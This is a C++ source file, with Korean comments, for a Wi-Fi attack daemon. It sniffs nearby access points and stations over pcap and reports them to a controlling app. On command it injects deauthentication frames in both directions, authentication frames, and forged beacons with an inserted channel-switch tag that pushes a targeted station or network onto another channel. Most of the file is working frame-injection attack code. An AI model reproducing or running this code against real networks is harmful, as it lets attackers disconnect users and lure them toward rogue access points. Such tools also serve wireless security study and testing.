#include "runner.h"
#include "suseongtrace.h"
#include "mac.h"
#include "radiotap.h"
#include "wireless.h"

Runner::Runner()
{
    isRunning = false;
    pcapRX = nullptr;
    pcapTX = nullptr;
}

Runner::~Runner()
{
    stop();
}

void Runner::TXloop()
{
    while(isRunning)
    {
        ST_IPC_CMD cmd;
        {
            std::lock_guard<std::mutex> lock(cmdMutex);
            cmd = currentCmd;
        }

        uint8_t dummy[12] = {0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

        if(cmd.action == Act::DEAUTH)
        {
            // 1. AP -> STATION
            ST_DEAUTH_PACKET pktAtoS;
            memset(&pktAtoS, 0, sizeof(ST_DEAUTH_PACKET));
            memcpy(pktAtoS.rdt_hdr, dummy, sizeof(dummy));
            pktAtoS.wl = getApDeauth(currentCmd.target_ap, currentCmd.target_st);
            int res0 = pcap_sendpacket(pcapTX, (const u_char*)&pktAtoS, sizeof(pktAtoS));
            if (res0 != 0)
            {
                fprintf(stderr, "[DAEMON TX] sendpacket failed: %s\n", pcap_geterr(pcapTX));
                fflush(stderr);
            }

            // 2. STATION -> AP
            ST_DEAUTH_PACKET pktStoA;
            memset(&pktStoA, 0, sizeof(ST_DEAUTH_PACKET));
            memcpy(pktStoA.rdt_hdr, dummy, sizeof(dummy));
            pktStoA.wl = getStDeauth(currentCmd.target_ap, currentCmd.target_st);
            int res1 = pcap_sendpacket(pcapTX, (const u_char*)&pktStoA, sizeof(pktStoA));
            if (res1 != 0)
            {
                fprintf(stderr, "[DAEMON TX] sendpacket failed: %s\n", pcap_geterr(pcapTX));
                fflush(stderr);
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(300));
        }
        else if(cmd.action == Act::AUTH)
        {
            ST_AUTH_PACKET authPacket;
            memset(&authPacket, 0, sizeof(ST_AUTH_PACKET));
            memcpy(authPacket.rdt_hdr, dummy, sizeof(dummy));
            authPacket.wl = getAuth_H(cmd.target_ap, cmd.target_st);
            authPacket.auth = getAuth_B();

            int res0 = pcap_sendpacket(pcapTX, (const u_char*)&authPacket, sizeof(authPacket));
            if(res0 != 0)
            {
                fprintf(stderr, "[DAEMON TX] sendpacket failed: %s\n", pcap_geterr(pcapTX));
                fflush(stderr);
            }
/*
            std::this_thread::sleep_for(std::chrono::milliseconds(20));

            ST_ACK_PACKET ackPacket;
            memset(&ackPacket, 0, sizeof(ST_ACK_PACKET));
            memcpy(ackPacket.rdt_hdr, dummy, sizeof(dummy));
            ackPacket.ack = getAck(cmd.target_ap);
            int res1 = pcap_sendpacket(pcapTX, (const u_char*)&ackPacket, sizeof(ackPacket));
            if(res1 != 0)
            {
                fprintf(stderr, "[DAEMON TX] sendpacket failed: %s\n", pcap_geterr(pcapTX));
                fflush(stderr);
            }
*/
            std::this_thread::sleep_for(std::chrono::milliseconds(300));
        }
        else
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    }
}

void Runner::RXloop(const std::string& dev)
{
    isRunning = true;
    device = dev;

    pcapRX = pcap_open_live(device.c_str(), BUFSIZ, 1, 100, errbuf);
    pcapTX = pcap_open_live(device.c_str(), BUFSIZ, 1, 100, errbuf);
    if(pcapRX == nullptr)
    {
        std::string errMsg = "pcap_open_live failed: ";
        errMsg += errbuf;
        TRACE(errMsg);
        return;
    }

    pcap_setnonblock(pcapRX, 1, errbuf);

    // TX쓰레드
    memset(&currentCmd, 0, sizeof(ST_IPC_CMD));
    TXthread = std::thread(&Runner::TXloop, this);

    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;
    bool isStationMode = false;

    // poll
    int pcap_fd = pcap_get_selectable_fd(pcapRX);
    if(pcap_fd < 0)
    {
        TRACE("pcap_get_selectable_fd failed");
        return;
    }
    struct pollfd fds[2];
    fds[0].fd = STDIN_FILENO; // 앱
    fds[0].events = POLLIN;

    fds[1].fd = pcap_fd; // PCAP
    fds[1].events = POLLIN;

    while(isRunning)
    {
        int ret = poll(fds, 2, 100);
        if(ret<0) break;        // err
        if(ret==0) continue;    // timeout

        // IPC 이벤트 처리
        if(fds[0].revents & POLLIN)
        {
            ST_IPC_CMD cmd;
            int readBytes = read(STDIN_FILENO, &cmd, sizeof(ST_IPC_CMD));
            if(readBytes == sizeof(ST_IPC_CMD))
            {
                std::lock_guard<std::mutex> lock(cmdMutex);
                currentCmd = cmd;

                isStationMode = false;
                for(int i=0; i<6; i++) { if(currentCmd.target_st.mac[i] != 0xFF) isStationMode = true; }
                fprintf(stderr, "[DAEMON] IPC Command Received Action: %d\n", cmd.action);
                fflush(stderr);
                if (currentCmd.action == Act::STOP) break;
            }
            else if(readBytes <= 0)
            {
                fprintf(stderr, "[DAEMON] IPC Pipe Closed. Exit RXloop.\n");
                fflush(stderr);
                break;
            }
        }

        // 패킷 캡처 이벤트 처리
        if(fds[1].revents & POLLIN)
        {
            // Sniffing
            res = pcap_next_ex(pcapRX, &header, &packet);
            if(res == 0) continue; // 타임아웃
            if(res == -1 || res == -2) break; // error, breakloop

            const ST_RDT* rdt = reinterpret_cast<const ST_RDT*>(packet);
            const ST_WL* wl = reinterpret_cast<const ST_WL*>(packet+rdt->len);

            WLTYPE type = chkWlType(wl);

            if(type == WLTYPE::AP)
            {
                uint64_t wirelessLen = sizeof(ST_WL);
                int16_t tagLen = 0;

                if (!chkBeacon(*wl)) continue;
                if (currentCmd.action == Act::CSA && memcmp(wl->bssid.mac, currentCmd.target_ap.mac, 6) == 0)
                {
                    // CSA Start
                    // action frame도 있음
                    int packetCount = presentCount(packet);
                    uint32_t capLen = header->caplen;
                    bool isFcs = hasFcs(packet, rdt, packetCount);

                    const u_char* beaconTagPacket = (packet+rdt->len+wirelessLen+sizeof(ST_BC_COMMON));
                    tagLen = capLen-rdt->len-wirelessLen-sizeof(ST_BC_COMMON);
                    uint16_t newPacketLen = capLen + 5;

                    if (isFcs) { tagLen -= 4; newPacketLen -=4; }

                    uint16_t insertTagLoc = capLen - (isFcs?4:0) - tagLen + getInsertTagLoc(beaconTagPacket, tagLen, 37);
                    uint16_t remainLen = capLen - insertTagLoc - (isFcs?4:0);

                    uint8_t newPacket[4096];
                    bool stationMode = false;
                    for(int i=0; i<6; i++) { if(currentCmd.target_st.mac[i] != 0xFF) stationMode = true; }
                    if(stationMode)
                    {
                        memcpy(newPacket, packet, rdt->len + 4);
                        memcpy(newPacket + rdt->len + 4, currentCmd.target_st.mac, 6);
                        memcpy(newPacket + rdt->len, packet + rdt->len + 10, insertTagLoc - rdt->len - 10);
                    }
                    else
                    {
                        memcpy(newPacket, packet, insertTagLoc);
                    }

                    uint8_t csaTag[5] = {0x25, 0x03, 0x01, (uint8_t)currentCmd.channel, 0x03};
                    memcpy(newPacket + insertTagLoc, csaTag, 5);
                    memcpy(newPacket + insertTagLoc + 5, packet + insertTagLoc, remainLen);

                    pcap_sendpacket(pcapTX, newPacket, newPacketLen);
                    // CSA End
                }

                ST_IPC_EVENT event;
                memset(&event, 0, sizeof(event));
                event.type = 0;
                event.bssid = wl->bssid;

                const u_char* tagStart = (packet + rdt->len + 24 + 12);
                tagLen = header->caplen - rdt->len - 36;
                // getEssid -> TAG 0이 없으면 false, 있으면 true
                if(!getEssid(event.essid, sizeof(event.essid), tagStart, tagLen)) continue;

                ST_RDT_DATA rdtData = getRdtInfo(packet, rdt, presentCount(packet));
                if(rdtData.pwr != 999) event.pwr = static_cast<int16_t>(rdtData.pwr);
                int ch = getCh(tagStart, tagLen);
                if(0 < ch)
                {
                    event.ch = static_cast<int16_t>(ch);
                }
                else // ch정보가 비콘 바디에 없는 경우. 라디오탭거 사용.
                {
                    if(rdtData.ch != 0)
                    {
                        event.ch = static_cast<int16_t>(rdtData.ch);

                    }
                    else event.ch = 0;
                }

                std::lock_guard<std::mutex> outLock(outMutex);
                fwrite(&event, sizeof(ST_IPC_EVENT), 1, stdout);
                fflush(stdout);
            }
            else if(type == WLTYPE::STATION)
            {
                ST_STATION_INFO stInfo;
                if(getStationInfo(rdt, wl, stInfo))
                {
                    ST_IPC_EVENT event;
                    memset(&event, 0, sizeof(ST_IPC_EVENT));

                    event.type = 1;
                    event.bssid = stInfo.bssid;
                    event.st_mac = stInfo.st_mac;
                    ST_RDT_DATA rdtData = getRdtInfo(packet, rdt, presentCount(packet));
                    if(rdtData.pwr != 999) event.pwr = static_cast<int16_t>(rdtData.pwr);

                    std::lock_guard<std::mutex> outLock(outMutex);
                    fwrite(&event, sizeof(ST_IPC_EVENT), 1, stdout);
                    fflush(stdout);
                }
            }



        }
    }

    isRunning = false;
    if(TXthread.joinable()) TXthread.join();
    pcap_close(pcapRX);
    pcap_close(pcapTX);
    pcapRX = nullptr;
    pcapTX = nullptr;

}

void Runner::stop()
{
    isRunning = false;
    if(pcapRX != nullptr) pcap_breakloop(pcapRX);
    if(pcapTX != nullptr) pcap_breakloop(pcapTX);
}
